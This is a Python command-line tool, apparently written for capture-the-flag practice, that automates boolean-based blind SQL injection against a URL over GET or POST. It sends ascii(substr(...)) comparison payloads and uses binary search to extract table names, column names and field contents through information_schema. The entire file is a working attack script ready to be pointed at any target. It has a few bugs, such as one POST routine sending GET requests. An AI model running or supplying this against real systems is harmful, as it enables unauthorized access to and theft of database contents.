import requests
import sys
import getopt
import json

# post 方法
class BlindPost():
    def __init__(self, url, method, data):
        self.url = url
        self.methods = method
        self.fet = input("输入盲注的特征信息:")
        self.tables = ""
        self.columns = ""
        self.datas = data

    def pwn_tables_post(self):
        tables = ""
        t = input("如果已知表名 请在此输入 不知道回车即可:")

        if t:
            self.tables = t

        else:
            try:
                for i in range(1, 30):  # sql substr从1开始

                    l = 32
                    h = 127
                    mid = (l + h) // 2
                    while l < h:
                        p = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0)%23"

                        pd = {f"{self.datas}": p}

                        if self.fet in requests.post(url=self.url,data=pd).text:
                            l = mid + 1
                        else:
                            h = mid
                        mid = (l + h) // 2

                    if mid == 32 or mid == 127:
                        break
                    tables += chr(mid)
                    print(tables)
                print(f"[*]表名:{tables}")
                self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns_post(self):
        columns = ""
        c = input("如果已知列名 请在此输入需要查询的列名 没有请回车：")
        if c:
            self.columns = c
            self.pwn_fields_post()

        else:
            if len(self.tables) > 1:
                t = input("输入需要查询的表:")

            table = "0x" + "".join(f"{ord(char):02x}" for char in t)
            try:
                for i in range(1, 30):

                    l = 33
                    h = 126
                    mid = (l + h) // 2
                    while l < h:  # 二分查找不加等号

                        p2 = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},1,0)%23"
                        pd = {f"{self.datas}": p2}
                        if self.fet in requests.get(url=self.url,data=pd).text:
                            l = mid + 1
                        else:
                            h = mid
                        mid = (l + h) // 2

                    if mid == 33 or mid == 126:
                        break
                    columns += chr(mid)

                print(f"[*]列为{columns}")
                c = input("选择需要查询的列")
                self.columns = c
                self.pwn_fields_post()

            except Exception as e:
                print(e)

    def pwn_fields_post(self):


            fields = ""
            try:
                print(self.tables)
                for i in range(1, 30):
                    l = 33
                    h = 126
                    mid = (l + h) // 2
                    while l < h:  # 二分查找不加等号
                        p3 = f"if(ascii(substr((select {self.columns} from {self.tables} ),{i},1))>{mid},1,0)%23"

                        pd = {f"{self.datas}":p3}

                        if self.fet in requests.post(url=self.url, data=pd).text:
                            l = mid + 1

                        else:
                            h = mid
                        mid = (l + h) // 2

                    if mid == 33 or mid == 126:
                        break
                    fields += chr(mid)
                    print(f"[*]此时字段为 {fields}")
            except Exception as e:
                print(e)

    def start(self):
        if self.methods == 'POST':
            self.pwn_tables_post()
            self.pwn_columns_post()






# get方法
class Blind():
    def __init__(self, url, method):
        self.url = url
        self.methods = method
        self.fet = input("输入盲注的特征信息:")
        self.tables = ""
        self.columns = ""


    def pwn_tables(self):
        tables = ""
        t = input("如果已知表名 请在此输入 不知道回车即可:")

        if t:
            self.tables = t

        else:
            try:
                for i in range(1, 30):  # sql substr从1开始

                    l = 32
                    h = 127
                    mid = (l + h) // 2
                    while l < h:

                        p = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0)%23"

                        if self.fet in requests.get(url=self.url + p).text:
                            l = mid + 1
                        else:
                            h = mid
                        mid = (l + h) // 2

                    if mid == 32 or mid == 127:
                        break
                    tables += chr(mid)
                    print(tables)
                print(f"[*]表名:{tables}")
                self.tables = tables  # 将表名转为16进制防止 引号被过滤

            except Exception as e:
                print(e)

    def pwn_columns(self):
        columns = ""
        c = input("如果已知列名 请在此输入需要查询的列名 没有请回车：")
        if c:
            self.columns = c
            self.pwn_field()

        else:
            if len(self.tables) > 1:
                t = input("输入需要查询的表:")

            table = "0x" + "".join(f"{ord(char):02x}" for char in t)
            try:
                for i in range(1, 30):

                    l = 33
                    h = 126
                    mid = (l + h) // 2
                    while l < h:  # 二分查找不加等号

                        p2 = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name={table}),{i},1))>{mid},1,0)%23"
                        if self.fet in requests.get(url=self.url + p2).text:
                            l = mid + 1
                        else:
                            h = mid
                        mid = (l + h) // 2

                    if mid == 33 or mid == 126:
                        break
                    columns += chr(mid)

                print(f"[*]列为{columns}")
                c = input("选择需要查询的列")
                self.columns = c
                self.pwn_field()

            except Exception as e:
                print(e)

    def pwn_field(self):

        fields = ""
        try:
            print(self.tables)
            for i in range(1, 30):
                l = 33
                h = 126
                mid = (l + h) // 2
                while l < h:  # 二分查找不加等号

                    p3 = f"if(ascii(substr((select {self.columns} from {self.tables} ),{i},1))>{mid},1,0)%23"

                    if self.fet in requests.get(url=self.url + p3).text:
                        l = mid + 1

                    else:
                        h = mid
                    mid = (l + h) // 2

                if mid == 33 or mid == 126:
                    break
                fields += chr(mid)
                print(f"[*]此时字段为 {fields}")
        except Exception as e:
            print(e)

    def start(self):
        if self.methods == 'GET':
            self.pwn_tables()
            self.pwn_columns()







def main():
    global url
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hu:", ["help", "GET", "POST="])
        if not opts:
            doc = """
This is a sql blind injection script for ctf
////////////////////////////////////////////
use help:
[*] -u <url>
[*] -h/--help   [helps]
[*] --GET [use GET request]
[*] --POST=<post data> [use POST request]
////////////////////////////////////////////   
            """
            print(doc)

    except getopt.GetoptError:
        print('sqlblind.py -u <url> --GET[--POST]')
        sys.exit(2)

    for arg, opt in opts:
        if arg == '-u':
            url = opt

        elif arg == '--GET':
            a = Blind(url, 'GET')
            a.start()

        elif arg == '--POST':

            datas = opt
            b = BlindPost(url, 'POST',datas)
            b.start()

        if arg == '-h' or arg == '--help' or opts == []:
            print("输入格式 如 python sqlblind.py -u http://xxxx.com --GET ")


if __name__ == '__main__':
    main()
